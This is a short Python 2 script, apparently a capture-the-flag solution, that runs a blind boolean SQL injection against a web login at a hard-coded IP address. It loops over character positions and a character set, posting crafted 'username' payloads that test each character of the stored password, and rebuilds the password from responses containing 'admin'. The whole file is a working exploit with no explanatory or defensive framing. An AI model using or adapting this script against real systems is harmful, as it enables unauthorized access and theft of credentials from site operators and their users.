import requests
url = 'http://117.34.111.15:89/?action=show'
passwd = ''
lists = '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'
for i in xrange(1,33):
	print i
	for p in lists:
		param = {'username':"-1'=(ascii(mid((passwd)from("+str(i)+")))="+str(ord(p))+")='0"}
		print requests.post(url,data=param).content
		if 'admin' in requests.post(url,data=param).content:
			passwd += p
			break
print passwd



